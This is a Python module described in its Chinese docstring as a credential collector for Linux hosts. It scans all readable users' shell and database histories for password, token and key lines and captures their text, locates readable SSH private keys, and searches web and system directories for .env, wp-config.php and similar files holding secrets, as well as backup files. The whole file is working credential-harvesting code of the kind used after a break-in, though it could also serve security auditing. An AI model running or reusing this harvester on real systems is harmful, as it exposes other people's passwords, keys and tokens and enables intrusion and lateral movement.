# -*- coding: utf-8 -*-
"""凭据采集器: 历史记录、SSH 密钥、配置文件、备份文件。"""
import os
import glob
import pwd


HISTORY_FILES = [
    '.bash_history', '.zsh_history', '.sh_history', '.ksh_history',
    '.python_history', '.mysql_history', '.psql_history',
    '.lesshst', '.viminfo', '.wget-hsts', '.irb_history',
    '.node_repl_history',
]

SENSITIVE_KEYWORDS = [
    'password', 'passwd', 'pass=', 'pwd=', '--password',
    'mysql -u', 'mysql -p', 'psql -U', 'sshpass',
    'token', 'api_key', 'apikey', 'secret', 'access_key',
    'private_key', 'aws_secret', 'curl -u', 'bearer', 'authorization',
    'chpasswd', 'usermod -p',
]

CONFIG_KEYWORDS = [
    'password', 'passwd', 'pass =', 'pass=', 'db_pass',
    'secret', 'api_key', 'token', 'access_key', 'private_key',
    'aws_secret', 'smtp_pass', 'credentials',
]

WEB_CONFIG_NAMES = [
    '.env', 'wp-config.php', 'config.php', 'settings.py',
    'database.yml', 'config.json', 'config.yml', '.htpasswd',
    'docker-compose.yml', 'application.properties',
]

SSH_KEY_GLOBS = [
    '/root/.ssh/id_*', '/home/*/.ssh/id_*',
    '/root/.ssh/*_rsa', '/home/*/.ssh/*_rsa',
    '/root/.ssh/*_ed25519', '/home/*/.ssh/*_ed25519',
    '/root/.ssh/*_ecdsa', '/home/*/.ssh/*_ecdsa',
]

BACKUP_SUFFIXES = ['.bak', '.old', '.backup', '.orig', '.save', '~', '.swp']


def _owner(path):
    try:
        return pwd.getpwuid(os.stat(path).st_uid).pw_name
    except Exception:
        return 'unknown'


def _scan_history(paths):
    hits = []
    for hp in paths:
        try:
            with open(hp, 'r', errors='ignore') as f:
                lines = f.readlines()
        except Exception:
            continue
        local = []
        for i, line in enumerate(lines, 1):
            ll = line.lower()
            for kw in SENSITIVE_KEYWORDS:
                if kw in ll:
                    local.append({'line_no': i, 'content': line.strip()[:300], 'keyword': kw})
                    break
        if local:
            hits.append({
                'file': hp,
                'owner': _owner(hp),
                'hits': local[:20],
                'total': len(local),
            })
    return hits


def _discover_histories():
    paths = set()
    home = os.path.expanduser('~')
    for hf in HISTORY_FILES:
        p = os.path.join(home, hf)
        if os.path.isfile(p):
            paths.add(p)
    # 其他用户 (若可读)
    if os.path.isdir('/home'):
        try:
            for u in os.listdir('/home'):
                uh = os.path.join('/home', u)
                if not os.path.isdir(uh) or uh == home:
                    continue
                for hf in HISTORY_FILES:
                    p = os.path.join(uh, hf)
                    if os.path.isfile(p) and os.access(p, os.R_OK):
                        paths.add(p)
        except Exception:
            pass
    # root
    if os.path.isdir('/root'):
        for hf in HISTORY_FILES:
            p = os.path.join('/root', hf)
            if os.path.isfile(p) and os.access(p, os.R_OK):
                paths.add(p)
    return list(paths)


def _scan_ssh_keys():
    keys = []
    for g in SSH_KEY_GLOBS:
        for p in glob.glob(g):
            if p.endswith('.pub') or 'known_hosts' in p or p.endswith('/config'):
                continue
            if os.path.isfile(p) and os.access(p, os.R_OK):
                try:
                    with open(p, 'r', errors='ignore') as f:
                        head = f.readline()
                except Exception:
                    head = ''
                # 跳过非私钥文件
                if 'PRIVATE KEY' not in head:
                    continue
                keys.append({
                    'path': p,
                    'owner': _owner(p),
                    'size': os.path.getsize(p),
                })
    return keys


def _scan_web_configs():
    found = []
    for base in ['/var/www', '/srv/www', '/opt', '/etc']:
        if not os.path.isdir(base):
            continue
        try:
            for root, dirs, files in os.walk(base):
                depth = root[len(base):].count(os.sep)
                if depth > 4:
                    dirs[:] = []
                    continue
                for f in files:
                    if f in WEB_CONFIG_NAMES:
                        fp = os.path.join(root, f)
                        if not os.access(fp, os.R_OK):
                            continue
                        try:
                            with open(fp, 'r', errors='ignore') as fh:
                                content = fh.read(65536)
                        except Exception:
                            continue
                        kws = [k for k in CONFIG_KEYWORDS if k in content.lower()]
                        if kws:
                            found.append({
                                'path': fp,
                                'owner': _owner(fp),
                                'keywords': kws[:10],
                            })
        except Exception:
            pass
    return found


def _scan_backups():
    found = []
    for base in ['/etc', '/var/www', '/home', '/opt']:
        if not os.path.isdir(base):
            continue
        try:
            for root, dirs, files in os.walk(base):
                depth = root[len(base):].count(os.sep)
                if depth > 3:
                    dirs[:] = []
                    continue
                for f in files:
                    if any(f.endswith(s) for s in BACKUP_SUFFIXES):
                        fp = os.path.join(root, f)
                        if os.access(fp, os.R_OK):
                            found.append(fp)
                if len(found) > 100:
                    break
        except Exception:
            pass
        if len(found) > 100:
            break
    return found


def collect():
    return {
        'histories': _scan_history(_discover_histories()),
        'ssh_keys': _scan_ssh_keys(),
        'web_configs': _scan_web_configs(),
        'backups': _scan_backups(),
    }